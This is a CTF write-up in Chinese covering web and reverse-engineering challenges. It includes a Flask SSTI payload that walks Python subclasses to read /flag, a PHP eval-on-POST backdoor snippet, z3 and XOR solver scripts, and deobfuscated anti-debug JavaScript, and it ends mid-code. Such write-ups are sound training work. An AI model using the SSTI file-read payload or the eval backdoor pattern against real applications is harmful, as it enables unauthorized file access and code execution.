你买车票没题目是一个登录框，需要输入账号密码，但是好像不是sql注入（因为测不出来）每次提交都会弹窗xxx,没买车票不能上车!!!但是在返回的页面中并没有看到js代码或者请求的js文件 一开始以为是使用php动态生成的js代码，但是没有思路后面经过摸索发现是ssti模板注入，因为每次输入的用户名都会回显，所以可以使用&#123;&#123; 4-1 &#125;&#125;这样的输入测试，如果返回3就说明存在ssti模板注入 确定了存在模板注入之后，还要确定怎么写payloadflask之ssti模版注入从零到入门 - 先知社区 (aliyun.com) payload有很多种，一般是从字符串或者列表出发，向上找基类，然后从基类往下找可以读取文件的函数这里使用的payload：&#123;&#123;\"\".__class__.__bases__[0].__subclasses__()[99]['get_data'](0,\"/flag\")&#125;&#125; 一般到subclasses之后就需要手动找目标函数，然后传入需要读的文件的路径，这里找到的是FileLoader XSCTF&#123;SsT1_MilKTea_m1LktEa!&#125; 隐秘的backdoor12345678910&lt;?php error_reporting(0); highlight_file(__FILE__); $cmd = $_POST[&#x27;cmd&#x27;]; if(isset($_POST[&#x27;cmd&#x27;]))&#123; phpinfo(); die(&quot;不要这样！TuT&quot;); &#125; else &#123; $cmd = $_POST[&#x27;cmd&#x27;]; eval($cmd); &#125; ?&gt; 查询了很多绕过的方式，还是不行然后看了看php的版本，查到了这个版本的漏洞 具体上网搜 flag&#123;B@ck_do0r_!_B4ck_d0or_!&#125; calculate查壳，发现upx，upx.exe -d calculate.exe然后扔进ida，发现这么一个函数 百度下叫约束求解（看起来有点像矩阵运算）1000多行手工提取不实际，写个脚本处理下 1234567891011121314151617with open(&#x27;asd.txt&#x27;, &#x27;r&#x27;) as f: content = f.readlines()tmp = &#x27;&#x27;final = []for i in content: if &quot;return 0i64;&quot; not in i: tmp += i.strip() else: final.append(tmp) tmp = &#x27;&#x27;print(final)with open(&#x27;tmp1.txt&#x27;, &#x27;w&#x27;) as f: for i in final: f.write(i+&#x27;\\n&#x27;) 初步处理之后手动删去前后缀，就得到了公式（字符串版） 然后使用python中一个叫z3的库，专门用来求解这种方程组其中有一个方法可以将字符串版的方程转换为python可以处理的表达式 以下是一个模板 1234567891011121314151617181920212223242526from z3 import * def solver_eng(fc): # 创建解释器对象 solver = Solver() # 添加约束方程 for i in range(len(fc)): solver.add(eval(fc[i])) #eval函数会将字符串形式的方程转换为z3模块能解析的方程 # 求解并转化为字符输出，得到flag if solver.check() == sat: # check()方法用来判断是否有解，sat(即satisify)表示满足有解 ans = solver.model() # model()方法得到解 for i in v: print(chr(ans[i].as_long()), end=&#x27;&#x27;) # 一般不会无解，如果无解八成是未知数变量的类型不符合，或约束方程添加错误 else: print(&quot;no ans!&quot;) if __name__ == &#x27;__main__&#x27;: # 设置方程，请用脚本将条件中的所有方程处理成列表，然后赋值给fc列表（这样你就不用一个一个方程慢慢去复制了） fc = [] # 创建未知数变量 v = [Int(f&#x27;v&#123;i&#125;&#x27;) for i in range(0, len(fc))] solver_eng(fc) 根据题目修改一下 12345678910111213141516171819202122232425from z3 import *with open(&#x27;tmp1.txt&#x27;, &#x27;r&#x27;) as f: content = f.readlines()def solver_eng(fc): solver = Solver() for i in range(len(fc)): solver.add(eval(fc[i])) if solver.check() == sat: ans = solver.model() for i in v: print(chr(ans[i].as_long()), end=&#x27;&#x27;) else: print(&#x27;Error&#x27;)if __name__ == &#x27;__main__&#x27;: fc = [] for i in content: fc.append(i.strip()) v = [Int(f&#x27;v&#123;i&#125;&#x27;) for i in range(0, len(fc))] solver_eng(fc) flag&#123;n0w_y0u_know_UPX!&#125; z3求解器脚本（CTF-reverse必备）_ctf z3-CSDN博客 call_above_call核心代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// bad sp value at call has been detected, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp-14h] [ebp-90h] int v5; // [esp-10h] [ebp-8Ch] int v6; // [esp-Ch] [ebp-88h] int v7; // [esp-8h] [ebp-84h] int v8; // [esp-4h] [ebp-80h] int v9; // [esp+0h] [ebp-7Ch] int v10; // [esp+4h] [ebp-78h] int i; // [esp+4h] [ebp-78h] int v12; // [esp+8h] [ebp-74h] char s[100]; // [esp+Ch] [ebp-70h] BYREF unsigned int v14; // [esp+70h] [ebp-Ch] int *p_argc; // [esp+74h] [ebp-8h] p_argc = &amp;argc; v14 = __readgsdword(0x14u); v12 = generate(); printf(&quot;input your key:&quot;); ((void (__stdcall *)(const char *, char *, int, int, int, int, int, int, int, int))__isoc99_scanf)( &quot;%s&quot;, s, v4, v5, v6, v7, v8, 1, v10, v12); if ( strlen(s) != 25 ) &#123; printf(&quot;Sorry!&quot;); exit(0); &#125; wuhuwuhu((int)s); for ( i = 0; i &lt;= 24; ++i ) &#123; if ( s[i] != *(_BYTE *)(enc + i) ) &#123; v9 = 0; break; &#125; &#125; if ( v9 ) printf(&quot;Congratulations!&quot;); else printf(&quot;try again!&quot;); end_m(p_argc); return 0;&#125; 12345678int __cdecl wuhuwuhu(int a1)&#123; int i; // [esp+8h] [ebp-Ch] for ( i = 0; i &lt;= 23; ++i ) *(_BYTE *)(i + a1) ^= *(_BYTE *)(i + 1 + a1); return a1;&#125; 主要逻辑：接收输入然后循环异或输入（元素1和元素2异或的结果替换元素1），然后和目标数组比较，但是目标数组是动态的，因此需要动态调试拿到目标数组后反过来异或就可以了 exp 1234567s = [0x0A, 0x0D, 0x06, 0x1C, 0x4B, 0x49, 0x17, 0x5A, 0x59, 0x04, 0x0A, 0x3C, 0x3B, 0x57, 0x51, 0x17, 0x12, 0x38, 0x26, 0x00, 0x1D, 0x17, 0x52, 0x5C, 0x7D]for i in range(len(s)): s[len(s)-2-i] = s[len(s)-2-i] ^ s[len(s)-1-i]for i in s: print(chr(i), end=&#x27;&#x27;) flag&#123;0yn4mic_d3bug_yyds!&#125; cube3题目描述 你玩过三阶魔方吗,你能看懂R U R’ U’这样的公式吗,这里有4个魔方等你来还原 公式(步骤)格式例如R U’ R U R U R U’ R’ U’ R2’ &lt;回车&gt;,每步操作用空格分开,逆时针加上’字符 flag格式为xsctf{formula},其中formula为4个魔方的还原步骤依次连在一起,去掉空格,取其md5 本题在Ubuntu22下编译,请不要使用ubuntu18 6个面，一共24种旋转操作，分析时需要对号入座 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+Bh] [rbp-3B5h] int v5; // [rsp+Ch] [rbp-3B4h] char v6[160]; // [rsp+10h] [rbp-3B0h] BYREF int v7[40]; // [rsp+B0h] [rbp-310h] BYREF char v8[160]; // [rsp+150h] [rbp-270h] BYREF int v9[114]; // [rsp+1F0h] [rbp-1D0h] BYREF unsigned __int64 v10; // [rsp+3B8h] [rbp-8h] v10 = __readfsqword(0x28u); cube_init((__int64)v9); print_menu(v9, argv); v4 = getchar(); getchar(); if ( v4 &lt;= &#x27;0&#x27; || v4 &gt; 52 ) &#123; if ( v4 == 53 ) puts(&quot;bye!&quot;); else puts(&quot;error!&quot;); &#125; else &#123; formula_get_by_id((__int64)v6, v4 - 48); cube_scramble((__int64)v9, (__int64)v6); cube_print((unsigned int *)v9); v5 = 0; formula_input((char *)v7); while ( v7[v5] != 24 ) cube_rotating((__int64)v9, v7[v5++]); cube_print((unsigned int *)v9); formula_reverse(v7, v8); if ( !(unsigned int)cube_isorigin(v9) || (unsigned int)formula_cmp(v6, v8) ) &#123; if ( (unsigned int)cube_isorigin(v9) &amp;&amp; (unsigned int)formula_cmp(v6, v8) ) puts(&quot;Restore successfully!!!But not reverse!!!&quot;); else puts(&quot;Restore failed!!!&quot;); &#125; else &#123; puts(&quot;Restore successfully!!!You reversed the formula!!!&quot;); &#125; &#125; printf(&quot;press anykey to continue...&quot;); getchar(); return 0;&#125; 运行是这样的 1234567891011121314151617181920212223242526272829303132333435363738394041~$ .&#x2F;cube3 三阶魔方 _______________________________________________ | | | 请输入编号: | | 1.打乱1 2.打乱2 | | 3.打乱3 4.打乱4 | | 5.退出程序 | | | | | ----------------------------------------------- 请输入编号[1&#x2F;2]:4 ________________ | 2 | 3 | 3 | +----+----+----+ | 2 | 4 | 4 | +----+----+----+ | 5 | 3 | 6 | +----+----+----+ &#x2F; 4 &#x2F; 5 &#x2F; 1 &#x2F;| &#x2F;____&#x2F;____&#x2F;____&#x2F; | &#x2F; 1 &#x2F; 1 &#x2F; 6 &#x2F;|3+ &#x2F;____&#x2F;____&#x2F;____&#x2F; |&#x2F;| &#x2F; 3 &#x2F; 5 &#x2F; 1 &#x2F;|1|1| ______________&#x2F;____&#x2F;____&#x2F;____&#x2F;4|&#x2F;|&#x2F;| | 1 | 5 | 5 | 2 | 4 | 6 |&#x2F;|6+1| +---+----+----+----+----+----+6|&#x2F;|&#x2F; | 5 | 5 | 2 | 6 | 3 | 3 |&#x2F;|6+ +---+----+----+----+----+----+2|&#x2F; | 6 | 2 | 3 | 6 | 3 | 5 |&#x2F; +---+----+----+----+----+----+ | 2 | 1 | 4 | +----+----+----+ | 4 | 2 | 4 | +----+----+----+ | 4 | 2 | 5 | +----+----+----+Enter a formula and separate each step with a spaceTip: The format of the operation is like R2 R2&#39; R[&#39;] represents a counterclockwise rotation&gt;&gt;&gt; 需要输入魔方的公式【初级篇】三阶魔方入门教程 - 知乎 (zhihu.com) 要还原魔方，最简单的方法是反着拧要反着拧，就要找到打乱的顺序 ida大部分函数看不懂没关系，可以凭感觉找到存储打乱顺序的变量 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596unsigned __int64 __fastcall formula_get_by_id(__int64 a1, int a2)&#123; int i; // [rsp+1Ch] [rbp-294h] int v4[162]; // [rsp+20h] [rbp-290h] BYREF unsigned __int64 v5; // [rsp+2A8h] [rbp-8h] v5 = __readfsqword(0x28u); memset(v4, 0, 0x280uLL); v4[0] = 23; v4[1] = 3; v4[2] = 4; v4[3] = 8; v4[4] = 18; v4[5] = 9; v4[6] = 12; v4[7] = 18; v4[8] = 13; v4[9] = 7; v4[10] = 20; v4[11] = 11; v4[12] = 13; v4[13] = 22; v4[14] = 14; v4[15] = 6; v4[16] = 8; v4[17] = 18; v4[18] = 4; v4[19] = 14; v4[20] = 24; v4[40] = 6; v4[41] = 22; v4[42] = 7; v4[43] = 13; v4[44] = 1; v4[45] = 4; v4[46] = 2; v4[47] = 8; v4[48] = 22; v4[49] = 19; v4[50] = 6; v4[51] = 10; v4[52] = 19; v4[53] = 21; v4[54] = 19; v4[55] = 7; v4[56] = 17; v4[57] = 8; v4[58] = 7; v4[59] = 12; v4[60] = 24; v4[80] = 5; v4[81] = 15; v4[82] = 19; v4[83] = 2; v4[84] = 5; v4[85] = 17; v4[86] = 12; v4[87] = 9; v4[88] = 7; v4[89] = 12; v4[90] = 18; v4[91] = 5; v4[92] = 12; v4[93] = 3; v4[94] = 11; v4[95] = 14; v4[96] = 5; v4[97] = 18; v4[98] = 6; v4[99] = 22; v4[100] = 24; v4[120] = 20; v4[121] = 12; v4[122] = 7; v4[123] = 21; v4[124] = 14; v4[125] = 23; v4[126] = 19; v4[127] = 13; v4[128] = 3; v4[129] = 18; v4[130] = 7; v4[131] = 3; v4[132] = 0x16; v4[134] = 8; v4[135] = 1; v4[136] = 0x12; v4[137] = 7; v4[138] = 0x12; v4[139] = 0xB; v4[140] = 0x18; for ( i = 0; v4[40 * a2 - 40 + i] != 24; ++i ) *(_DWORD *)(a1 + 4LL * i) = v4[40 * a2 - 40 + i]; *(_DWORD *)(4LL * i + a1) = 24; return v5 - __readfsqword(0x28u);&#125; 因为题目说一共有24种操作，刚好是v4元素的取值范围-1减一的原因是因为有四个魔方，最大的元素（24）的作用类似分隔符，通过主函数的while语句也可以判断出来，而且整个v4数组刚好被值为24的元素分隔成4部分，刚好对应4个魔方 因此可以将这些元素提取出来（有坑），然后映射到对应的公式，再反着输出就行 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849s = open(&#x27;./tmp.txt&#x27;, &#x27;r&#x27;).readlines()print(len(s))ss = []for i in s: num = &#x27;&#x27; for j in range(len(i)): if i[j] == &#x27;=&#x27;: num = i[j+1:-2] ss.append(int(num))rotate = [ &#x27;U&#x27;, &#x27;U\\&#x27;&#x27;, &#x27;U2&#x27;, &#x27;U2\\&#x27;&#x27;, &#x27;D&#x27;, &#x27;D\\&#x27;&#x27;, &#x27;D2&#x27;, &#x27;D2\\&#x27;&#x27;, &#x27;F&#x27;, &#x27;F\\&#x27;&#x27;, &#x27;F2&#x27;, &#x27;F2\\&#x27;&#x27;, &#x27;B&#x27;, &#x27;B\\&#x27;&#x27;, &#x27;B2&#x27;, &#x27;B2\\&#x27;&#x27;, &#x27;L&#x27;, &#x27;L\\&#x27;&#x27;, &#x27;L2&#x27;, &#x27;L2\\&#x27;&#x27;, &#x27;R&#x27;, &#x27;R\\&#x27;&#x27;, &#x27;R2&#x27;, &#x27;R2\\&#x27;&#x27;]for i in ss: if i == 24: print() else: print(rotate[i], end=&#x27; &#x27;)for i in range(len(ss)-1, -1, -1): if ss[i] == 24: print() else: if &#x27;\\&#x27;&#x27; in rotate[ss[i]]: print(rotate[ss[i]-1], end=&#x27; &#x27;) else: print(rotate[ss[i]+1], end=&#x27; &#x27;)print()sss = &#x27;&#x27;&#x27;B2&#x27; D&#x27; L2&#x27; F&#x27; D2&#x27; B2&#x27; R2&#x27; B F2 R&#x27; D2 B L2&#x27; B&#x27; F L2&#x27; F&#x27; D&#x27; U2 R2B&#x27; D2 F&#x27; L D2 L2 R L2 F2&#x27; D2&#x27; L2 R2&#x27; F&#x27; U2&#x27; D&#x27; U B D2 R2&#x27; D2&#x27;R2&#x27; D2&#x27; L2&#x27; D B2&#x27; F2 U2 B&#x27; D L2&#x27; B&#x27; D2 F B&#x27; L D U2&#x27; L2 B2 DF2 L2&#x27; D2 L2&#x27; U F&#x27; U&#x27; R2&#x27; U2 D2 L2&#x27; U2 B L2 R2 B2&#x27; R D2 B&#x27; R&#x27;&#x27;&#x27;&#x27;ssss = &#x27;&#x27;for i in sss: if i != &#x27; &#x27; and i != &#x27;\\n&#x27;: ssss += iprint(ssss) 这样就可以得到四个魔方的解法，可以使用程序验证，最后再将解法按照题目要求处理就行 xsctf&#123;0a15a3168e6bf08df8178186312b0396&#125; 坑 v4数组的定义种少了一个元素v4[133]，需要动态调试得到这个元素的值 因为是4个魔方一起反着输出，所以第一个魔方的解法应该对应第四行的输出 最后串起来的时候是第一个魔方的解法+第二个魔方的解法...，即第四行+第三行+… easy_xor核心代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax char v4; // al int v5; // eax char v7; // [rsp+33h] [rbp-Dh] char v8; // [rsp+33h] [rbp-Dh] int v9; // [rsp+34h] [rbp-Ch] int i; // [rsp+38h] [rbp-8h] int v11; // [rsp+3Ch] [rbp-4h] _main(); v11 = 0; v9 = 0; puts(&quot;Please input your flag:&quot;); while ( 1 ) &#123; v8 = getchar(); if ( v8 == 10 ) break; v7 = key[v9 % 4] ^ v8; while ( 1 ) &#123; v4 = v7--; if ( v4 &lt;= 0 ) break; v3 = v11++; s[v3] = 1; &#125; v5 = v11++; s[v5] = 0; ++v9; &#125; while ( v11 &lt;= 2559 ) s[v11++] = -1; for ( i = 0; i &lt;= 2559; ++i ) &#123; if ( r[i] != s[i] ) &#123; puts(&quot;Lose lose lose!&quot;); break; &#125; &#125; if ( i == 2560 ) puts(&quot;Win win win!&quot;); system(&quot;pause&quot;); return 0;&#125; 其中数组r是在运行时生成的，因此需要使用动态调试 大概的逻辑是： 接收输入直到回车符 计算每个字符异或的结果 异或的结果是多少，就在数组中添加多少个1，然后添加一个0 对比两个数组的差异 因此解密的逻辑就是 拿到目标数组 遍历数组中1的个数，直到遇到数字0 将以上1的个数循环异或key的元素 转换为字符输出 重复2到4，直到遇到-1 exp.py 1234567891011121314151617s = [...]ch = []key_index = 0key = &#x27;SCNU&#x27;c = 0for i in s: if i == 1: c += 1 elif i == 0: # print(hex(c), end=&#x27;&#x27;) ch.append(chr(c^ord(key[key_index%4]))) key_index += 1 c = 0 else: breakprint(&#x27;&#x27;.join(ch)) flag&#123;Winn3r_n0t_L0s3r_#&#125; eazy_64x123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+8h] [rbp-98h] int v5; // [rsp+Ch] [rbp-94h] int i; // [rsp+10h] [rbp-90h] int v7; // [rsp+14h] [rbp-8Ch] int v8; // [rsp+1Ch] [rbp-84h] char *v9; // [rsp+20h] [rbp-80h] char dest[4]; // [rsp+2Ch] [rbp-74h] BYREF char s[104]; // [rsp+30h] [rbp-70h] BYREF unsigned __int64 v12; // [rsp+98h] [rbp-8h] v12 = __readfsqword(0x28u); memset(s, 0, 0x64uLL); __isoc99_scanf(&amp;unk_222C, s); v7 = strlen(s); if ( v7 == 20 ) &#123; v4 = 0; v5 = 0; while ( v7 / 3 &gt;= v4 ) &#123; memset(dest, 0, sizeof(dest)); memcpy(dest, &amp;s[v5], 3uLL); v9 = encrypt(dest); v8 = strlen(v9); get_trans(v9); for ( i = 0; i &lt; v8; ++i ) &#123; if ( v9[i] != glob[4 * v4 + i] ) &#123; puts(&quot;Oh,no!&quot;); return 0; &#125; &#125; free(v9); ++v4; v5 += 3; &#125; printf(&quot;Good!&quot;); return 0; &#125; else &#123; printf(&quot;sorry!&quot;); return 0; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041_BYTE *__fastcall encrypt(const char *a1)&#123; int v2; // [rsp+10h] [rbp-70h] int v3; // [rsp+14h] [rbp-6Ch] __int64 v4; // [rsp+18h] [rbp-68h] signed __int64 v5; // [rsp+20h] [rbp-60h] _BYTE *v6; // [rsp+28h] [rbp-58h] char v7[72]; // [rsp+30h] [rbp-50h] BYREF unsigned __int64 v8; // [rsp+78h] [rbp-8h] v8 = __readfsqword(0x28u); strcpy(v7, &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;); v5 = strlen(a1); if ( v5 % 3 ) v4 = 4 * (v5 / 3 + 1); else v4 = 4 * (v5 / 3); v6 = malloc(v4 + 1); v6[v4] = 0; v2 = 0; v3 = 0; while ( v2 &lt; v4 - 2 ) &#123; v6[v2] = v7[(unsigned __int8)a1[v3] &gt;&gt; 2]; v6[v2 + 1] = v7[((unsigned __int8)a1[v3 + 1] &gt;&gt; 4) | (16 * a1[v3]) &amp; &#x27;0&#x27;]; v6[v2 + 2] = v7[((unsigned __int8)a1[v3 + 2] &gt;&gt; 6) | (4 * a1[v3 + 1]) &amp; 0x3C]; v6[v2 + 3] = v7[a1[v3 + 2] &amp; 0x3F]; v3 += 3; v2 += 4; &#125; if ( v5 % 3 == 1 ) &#123; v6[v2 - 2] = 61; v6[v2 - 1] = 61; &#125; else if ( v5 % 3 == 2 ) &#123; v6[v2 - 1] = 61; &#125; return v6;&#125; 看到这里觉得是base64，也有可能是换表base64，但是解不出来，接着看 1234567891011121314size_t __fastcall get_trans(const char *a1)&#123; size_t result; // rax int i; // [rsp+1Ch] [rbp-14h] for ( i = 0; ; ++i ) &#123; result = strlen(a1); if ( i &gt;= result ) break; a1[i] ^= 0x68u; &#125; return result;&#125; 在类似base编码之后还加了异或 思路： 异或还原 base64 exp 123456789import base64s = [0x32, 0x05, 0x10, 0x00, 0x32, 0x5B, 0x1B, 0x10, 0x30, 0x5A, 0x1F, 0x1F, 0x0C, 0x05, 0x3E, 0x0E, 0x0B, 0x05, 0x3E, 0x5A, 0x32, 0x3C, 0x21, 0x59, 0x32, 0x30, 0x58, 0x55]ss = &#x27;&#x27;for i in s: ss += chr(i^0x68) print(base64.b64decode(ss)) flag&#123;1_l0ve_reve25e&#125; JSNEWNEW一个html内嵌经过混淆的js代码 1((()=&gt;&#123;function _0x139d2b()&#123;setInterval(()=&gt;&#123;(function()&#123;return![]&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)[&#x27;call&#x27;]())&#125;,0x32)&#125;try&#123;_0x139d2b()&#125;catch(_0x536807)&#123;&#125;&#125;)());function _Y0u(_0x5093c8,_0x291ad5)&#123;return _0x5093c8+_0x291ad5&#125;function _C4n(_0x4277b8)&#123;return _0x4277b8&amp;0xff&#125;function _N3v3r(_0x414184,_0x29df09)&#123;return _C4n(_0x414184^_0x29df09)&#125;function _G37(_0x500f65,_0x1ddb85)&#123;return _C4n(_0x500f65|_0x1ddb85)&#125;function _Th15(_0x1621d6,_0x285fc7)&#123;return _C4n(_0x1621d6&amp;_0x285fc7)&#125;function _H4(_0x2abb65)&#123;return _C4n(~_0x2abb65)&#125;function _H4H4(_0x5b22bc)&#123;return _C4n(_H4H4H4(_H4(_0x5b22bc),_H4H4H4([],0x1)))&#125;function _H4H4H4(_0x431cb1,_0x516603)&#123;return _C4n((_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603)))),_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603))))))&#125;function _H4H4H4H4(_0x1b81b8,_0x11e8ab,_0x2c730f)&#123;return a=_H4H4H4(_0x1b81b8,_0x2c730f),a=_H4H4H4(a,_H4H4(_0x11e8ab)),a=_H4H4H4(a,_H4H4(_0x2c730f)),_C4n(a)&#125;function _G00D(_0x51eb06)&#123;((()=&gt;&#123;function _0x139d2b()&#123;setInterval(()=&gt;&#123;(function()&#123;return![]&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)[&#x27;call&#x27;]())&#125;,0x32)&#125;try&#123;_0x139d2b()&#125;catch(_0x536807)&#123;&#125;&#125;)());var _0x8b9e29=document[&#x27;getElementById&#x27;](&#x27;passwordError&#x27;);_0xcaf3caf3=[],_0xc4f3c4f3=[0x55,0xbf,0x63,0xbc,0x33,0x95,0x31,0x4c,0x89,0x6b,0x49,0x31,0x30,0xdf,0x63,0xe5,0x57,0xd7,0x73,0xa6,0x6e,0xd3,0x63,0xa1,0x92,0x5b,0x72,0xe6,0x8f,0x76,0x4f,0xd0],Hur1k=&#x27;Hur1k&#x27;;if(_0x51eb06[&#x27;length&#x27;]!=0x27)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;错误的&#x27;,![];if(_0x51eb06[&#x27;substr&#x27;](0x0,0x6)!=&#x27;XSCTF&#123;&#x27;)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;错误的&#x27;,![];if(_0x51eb06[0x26]!=&#x27;&#125;&#x27;)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;错误的&#x27;,![];_0x114514=_0x51eb06[&#x27;substr&#x27;](0x6,0x20),_0x51eb06=[];for(var _0x28db6c=0x0;_0x28db6c&lt;_0x114514[&#x27;length&#x27;];_0x28db6c++)&#123;_0x51eb06[&#x27;push&#x27;](_0x114514[&#x27;charCodeAt&#x27;](_0x28db6c))&#125;Math[&#x27;seed&#x27;]=new Date()[&#x27;getTime&#x27;](),Math[&#x27;seededRandom&#x27;]=function(_0x14b0c9,_0x56fb11)&#123;_0x56fb11=_0x56fb11||0x1,_0x14b0c9=_0x14b0c9||0x0,Math[&#x27;seed&#x27;]=(Math[&#x27;seed&#x27;]*0x2455+0xc091)%0x38f40;var _0xee8b23=Math[&#x27;seed&#x27;]/0x38f40;return parseInt(_0x14b0c9+_0xee8b23*(_0x56fb11-_0x14b0c9))&#125;;var _0xe5731c=Math[&#x27;seededRandom&#x27;](0x0,0x100);for(var _0x28db6c=0x0;_0x28db6c&lt;_0x51eb06[&#x27;length&#x27;];_0x28db6c+=0x2)&#123;tmp=_H4H4H4(_0x51eb06[_0x28db6c],_0x28db6c)^_0x28db6c,_0xcaf3caf3[&#x27;push&#x27;](tmp),randNum=Math[&#x27;seededRandom&#x27;](0x0,0x100),Math[&#x27;seed&#x27;]=randNum,tmp=_H4H4H4H4(tmp^_0x51eb06[_0x28db6c+0x1],Hur1k[&#x27;charCodeAt&#x27;]([_0x28db6c/0x2%Hur1k[&#x27;length&#x27;]]),randNum),_0xcaf3caf3[&#x27;push&#x27;](tmp)&#125;((()=&gt;&#123;function _0x139d2b()&#123;setInterval(()=&gt;&#123;(function()&#123;return![]&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)[&#x27;call&#x27;]())&#125;,0x32)&#125;try&#123;_0x139d2b()&#125;catch(_0x536807)&#123;&#125;&#125;)());if(_0xcaf3caf3[&#x27;length&#x27;]!=0x20)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;究极错误的&#x27;,![];for(var _0x28db6c=0x0;_0x28db6c&lt;_0xcaf3caf3[&#x27;length&#x27;];_0x28db6c++)&#123;if(_0xcaf3caf3[_0x28db6c]!=_0xc4f3c4f3[_0x28db6c])return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;错误的&#x27;,![]&#125;return!![]&#125; 首先经过Obfuscator.io Deobfuscator (deobfuscate.io)，初步解混淆再通过JavaScript Deobfuscator (deobfuscate.io)，再解一次然后就解不动了（不排除有其他工具） 解混淆的结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596(() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125;&#125;)();function _H4H4H4(_0x431cb1, _0x516603) &#123; ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255; return ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255 &amp; 255;&#125;function _H4H4H4H4(_0x1b81b8, _0x11e8ab, _0x2c730f) &#123; a = _H4H4H4(_0x1b81b8, _0x2c730f); a = _H4H4H4(a, _H4H4H4(~_0x11e8ab &amp; 255, _H4H4H4([], 1)) &amp; 255); a = _H4H4H4(a, _H4H4H4(~_0x2c730f &amp; 255, _H4H4H4([], 1)) &amp; 255); return a &amp; 255;&#125;function _G00D(_0x51eb06) &#123; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); var _0x8b9e29 = document.getElementById(&quot;passwordError&quot;); _0xcaf3caf3 = []; _0xc4f3c4f3 = [85, 191, 99, 188, 51, 149, 49, 76, 137, 107, 73, 49, 48, 223, 99, 229, 87, 215, 115, 166, 110, 211, 99, 161, 146, 91, 114, 230, 143, 118, 79, 208]; Hur1k = &quot;Hur1k&quot;; if (_0x51eb06.length != 39) &#123; _0x8b9e29.textContent = &quot;错误的&quot;; return false; &#125; if (_0x51eb06.substr(0, 6) != &quot;XSCTF&#123;&quot;) &#123; _0x8b9e29.textContent = &quot;错误的&quot;; return false; &#125; if (_0x51eb06[38] != &quot;&#125;&quot;) &#123; _0x8b9e29.textContent = &quot;错误的&quot;; return false; &#125; _0x114514 = _0x51eb06.substr(6, 32); _0x51eb06 = []; for (var _0x28db6c = 0; _0x28db6c &lt; _0x114514.length; _0x28db6c++) &#123; _0x51eb06.push(_0x114514.charCodeAt(_0x28db6c)); &#125; Math.seed = (new Date).getTime(); Math.seededRandom = function (_0x14b0c9, _0x56fb11) &#123; _0x56fb11 = _0x56fb11 || 1; _0x14b0c9 = _0x14b0c9 || 0; Math.seed = (Math.seed * 9301 + 49297) % 233280; var _0xee8b23 = Math.seed / 233280; return parseInt(_0x14b0c9 + _0xee8b23 * (_0x56fb11 - _0x14b0c9)); &#125;; for (var _0x28db6c = 0; _0x28db6c &lt; _0x51eb06.length; _0x28db6c += 2) &#123; tmp = _H4H4H4(_0x51eb06[_0x28db6c], _0x28db6c) ^ _0x28db6c; _0xcaf3caf3.push(tmp); randNum = Math.seededRandom(0, 256); Math.seed = randNum; tmp = _H4H4H4H4(tmp ^ _0x51eb06[_0x28db6c + 1], Hur1k.charCodeAt([_0x28db6c / 2 % Hur1k.length]), randNum); _0xcaf3caf3.push(tmp); &#125; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); if (_0xcaf3caf3.length != 32) &#123; _0x8b9e29.textContent = &quot;究极错误的&quot;; return false; &#125; for (var _0x28db6c = 0; _0x28db6c &lt; _0xcaf3caf3.length; _0x28db6c++) &#123; if (_0xcaf3caf3[_0x28db6c] != _0xc4f3c4f3[_0x28db6c]) &#123; _0x8b9e29.textContent = &quot;错误的&quot;; return false; &#125; &#125; return true;&#125; 然后就是手动解 从目标数组入手回溯 查看对目标数组操作的函数，尝试逆向 逆向不出来怎么办，把函数复制到控制台，传入简单的参数，然后逐个修改参数，观察函数输出 根据这个方法可以推测出_H4H4H4的实际作用是相加，_H4H4H4H4的实际功能是前两个参数相减，第三个参数是摆设 涉及到随机数的参数大概率没什么用 最后手动解混淆的结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899(() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125;&#125;)();function add(_0x431cb1, _0x516603) &#123; 